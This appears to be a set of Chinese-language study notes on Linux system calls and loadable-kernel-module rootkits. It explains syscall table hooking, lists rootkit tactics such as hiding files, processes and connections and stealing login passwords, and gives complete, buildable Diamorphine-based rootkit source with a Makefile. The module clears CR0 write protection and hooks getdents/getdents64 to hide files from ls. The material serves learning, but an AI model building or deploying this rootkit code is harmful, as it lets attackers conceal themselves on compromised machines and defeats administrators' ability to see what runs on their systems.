# Syscall

## 1.基本概念

隔离的特权： Linux 系统分为两个“空间”：

* 用户空间 (User Space)：运行的普通程序（如 ls, cat, 浏览器）都在这里。它们权限很低，不能直接操作硬件（比如读写文件、发送网络包）
* 内核空间 (Kernel Space)：操作系统核心（Kernel）运行的地方。它拥有最高权限，可以控制一切硬件

当用户空间的程序（比如 ls）需要读取目录内容时，它不能自己去读硬盘。它必须“请求”内核帮它做。这个“请求”的动作，就是系统调用

例如：ls 调用 opendir() -> C 库函数 opendir() 触发 getdents64 系统调用 -> 内核执行真正的 sys_getdents64 函数 -> 内核把结果返回给 ls



## 2.系统调用管理

使用一个“总调度表”，称为 系统调用表 (System Call Table)，在内核中通常（在 x86-64 架构上）被命名为 sys_call_table。

这个表本质上是一个巨大的 数组，里面存放的全是 函数指针（即内存地址）

查看系统完整的 syscall：

```shell
sudo apt install linux-headers-$(uname -r)
cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h
```

常用的系统调用：

| systemcall                                                   | description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| int sys_brk(unsigned long new_brk);                          | changes the size of used DS (data segment)                   |
| int sys_fork(struct pt_regs regs);                           | systemcall for the well-know fork() function in user space   |
| int sys_getuid (); int sys_setuid (uid_t uid) ...            | systemcalls for managing UID etc.                            |
| int sys_get_kernel_sysms(struct kernel_sym *table)           | systemcall for accessing the kernel system table             |
| int sys_sethostname (char *name, int len); int sys_gethostname (char * name, int len); | sys_sethostname is responsible for setting the hostname, and sys_gethostname for retrieving it |
| int sys_chdir (const char *path); int sys_fchdir (unsigned int fd); | both function are used for setting the current directory (cd ...) |
| int sys_chmod (const char *filename, mode_t mode); int sys_chown (const char * filename, mode_t mode); int sys_fchmod (unsigned int fildes, mode_t mode); int sys_fchown (unsigned int fildes, mode_t mode); | functions for managing permissions and so on                 |
| int sys_chroot (const char *filename);                       | sets root directory for calling process                      |
| int sys_execve (struct pt_regs regs);                        | important systemcall -> it is responsible for executing file (pt_regs is the register stack) |
| long sys_fcntl (unsigned int fd, unsigned int cmd, unsigned long arg); | changing characteristics of fd (opened file descr.)          |
| int sys_link (const char *oldname, const char * newname); int sym_link (const char *oldname, const char * newname); int sys_unlink (const char *name); | systemcalls for hard- / softlinks management                 |
| int sys_rename (const char *oldname, const char * newname);  | file renaming                                                |
| int sys_rmdir (const char * name); int sys_mkdir (const * char filename, int mode); | creating & removing directories                              |
| int sys_open (const char *filename, int mode); int sys_close (unsigned int fd); | everything concering opening files (also creation), and also closing them |
| int sys_read (unsigned int fd, char *buf, unsigned int count); int sys_write (unsigned int fd, char * buf, unsigned int count); | systemcalls for writing & reading from Files                 |
| int sys_getdents (unsigned int fd, struct dirent *dirent, unsigned int count); | systemcall which retrievs file listing (ls ... command)      |
| int sys_readlink (const char *path, char * buf, int bufsize); | reading symbolic links                                       |
| int sys_selectt (int n, fd_set *inp, fd_set * outp, fd_set *exp, struct timeval * tvp); | multiplexing of I/O operations                               |
| sys_socketcall (int call, unsigned long args);               | socket functions                                             |
| unsigned long sys_create_module (char *name, unsigned long size); int sys_delete_module (char * name); int sys_query_module (const char *name, int which, void * buf, size_t bufsize, size_t *ret); | used for loading / unloading LKMs and querying               |



## 3.hook 流程

hook 瞬间：

* 找到 sys_call_table：在内核内存中找到这个“总调度表”的地址
* 保存原始地址：读取 sys_call_table [217]（sys_getdents64 的地址），并把这个真正的、合法的函数地址保存在自己的一个变量里（比如 original_getdents）
* 实施篡改：覆盖 sys_call_table [217] 的内容，把它改成 rootkit 自己的一个恶意函数的地址（比如 hacked_getdents）

rootkit 的 hacked_getdents 函数内部：

- 恶意函数首先调用它之前保存的 original_getdents 地址

- 合法的 sys_getdents64 函数被执行，它从硬盘读取了所有的目录内容（包括一个名为 evil_rootkit.ko 的恶意文件）

- 合法的函数把这个完整列表返回给 rootkit 的 hacked_getdents

- hacked_getdents 拿到列表后，遍历这个列表，找到并删除了 evil_rootkit.ko 这一项

- hacked_getdents 把这个被“过滤”过的、不包含恶意文件的列表返回给用户空间的 ls 程序



## 4.常用技战法

- 隐藏文件 (hook `getdents64`)

- 隐藏进程 (hook `getpriority` 或 `kill`)

- 隐藏网络连接 (hook `recvmsg`)

- 窃取密码 (hook `read` 或 `write`，专门针对 `ssh` 或 `login` 进程)



## 5.transform Kernel to User Space Memory





## 6.实验

lkmdemo_init (初始化时)：

- 找到系统调用表

- 关闭内存写保护

- 保存原始的 getdents 和 getdents64 系统调用地址

- 将表中的地址替换为它自己的 hacked_getdents 和 hacked_getdents64 函数地址

- 重新打开内存写保护。


lkmdemo_cleanup (卸载时)：

- 关闭内存写保护

- 将它自己的恶意函数地址从表中移除，恢复原始的系统调用地址

- 重新打开内存写保护

make 后运行流程：

- 加载内核模块: insmod lkmdemo.ko
- 运行 ls, 会看到 malicious_file 从输出中隐藏了
- 运行 lsmod, 在输出中看到 lkmdem
- 卸载模块: rmmod lkmdemo

现代 Linux 内核中（2.6 版本以后）：sys_call_table 不再被“导出” (Exported)：LKM 不能再像 printk 那样直接按名字使用它。Rootkit 必须通过扫描内核内存（比如 kallsyms）来“猜”它的位置。

写保护 (Write Protection)：sys_call_table 所在的内存页通常被标记为只读。

现代 LKM rootkit 在执行实施篡改之前，还必须先绕过这个写保护。它们通常通过修改 CPU 的一个特定控制寄存器（`CR0`）来暂时关闭内核内存的写保护，修改完后再迅速打开。

```c
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#ifndef __NR_getdents
#define __NR_getdents 141
#endif
#define MAGIC_PREFIX "malicious_file"
#define MODULE_NAME "lkmdemo"

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

unsigned long cr0;
static unsigned long *__sys_call_table;
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents;
static t_syscall orig_getdents64;

// 在内核的所有符号（函数和变量）中按名称搜索并返回其内存地址
unsigned long * get_syscall_table_bf(void)
{
  unsigned long *syscall_table;
  syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
  return syscall_table;
}

// 过滤目录内容
static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
  struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
  // 调用原始函数
  int ret = orig_getdents64(pt_regs), err;
  unsigned long off = 0;
  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
  if (ret <= 0)
    return ret;
  // 复制到内核空间
  kdirent = kzalloc(ret, GFP_KERNEL);
  if (kdirent == NULL)
    return ret;
  err = copy_from_user(kdirent, dirent, ret);
  if (err)
    goto out;
  // 遍历和过滤
  while (off < ret) {
    dir = (void *)kdirent + off;
    if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0) {
      if (dir == kdirent) {
        ret -= dir->d_reclen;
        memmove(dir, (void *)dir + dir->d_reclen, ret);
        continue;
      }
      // 将前一个（合法的）文件的“记录长度”(d_reclen) 字段扩大，使其“吞并”当前这个恶意文件的空间
      prev->d_reclen += dir->d_reclen;
    } else
      prev = dir;
    off += dir->d_reclen;
  }
  // 复制返回用户空间
  err = copy_to_user(dirent, kdirent, ret);
  if (err)
    goto out;
out:
  kfree(kdirent);
  return ret;
}

static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
  struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
  int ret = orig_getdents(pt_regs), err;
  unsigned long off = 0;
  struct linux_dirent *dir, *kdirent, *prev = NULL;
  if (ret <= 0)
    return ret;	
  kdirent = kzalloc(ret, GFP_KERNEL);
  if (kdirent == NULL)
    return ret;
  err = copy_from_user(kdirent, dirent, ret);
  if (err)
    goto out;
  while (off < ret) {
    dir = (void *)kdirent + off;
    if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0) {
      if (dir == kdirent) {
        ret -= dir->d_reclen;
        memmove(dir, (void *)dir + dir->d_reclen, ret);
        continue;
      }
      prev->d_reclen += dir->d_reclen;
    } else
      prev = dir;
    off += dir->d_reclen;
  }
  err = copy_to_user(dirent, kdirent, ret);
  if (err)
    goto out;
out:
  kfree(kdirent);
  return ret;
}

static inline void write_cr0_forced(unsigned long val)
{
  unsigned long __force_order;
  asm volatile(
    "mov %0, %%cr0"
    : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void)
{
  write_cr0_forced(cr0);
}
static inline void unprotect_memory(void)
{
  write_cr0_forced(cr0 & ~0x00010000);
}

static int __init lkmdemo_init(void)
{
  __sys_call_table = get_syscall_table_bf();
  if (!__sys_call_table)
    return -1;
  cr0 = read_cr0();
  orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
  orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
  unprotect_memory();
  __sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
  __sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
  protect_memory();
  return 0;
}

static void __exit lkmdemo_cleanup(void)
{
  unprotect_memory();
  __sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
  __sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
  protect_memory();
}

module_init(lkmdemo_init);
module_exit(lkmdemo_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("demo");
MODULE_DESCRIPTION("LKM rootkit based on diamorphine");
```

```makefile
obj-m := lkmdemo.o
CC = gcc -Wall 
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
```

在 Linux 内核版本 2.6.33 到 5.7.0 之间，kallsyms_lookup_name 被导出，可以直接使用。但是，在内核版本 5.7 之后，这个函数不再被导出



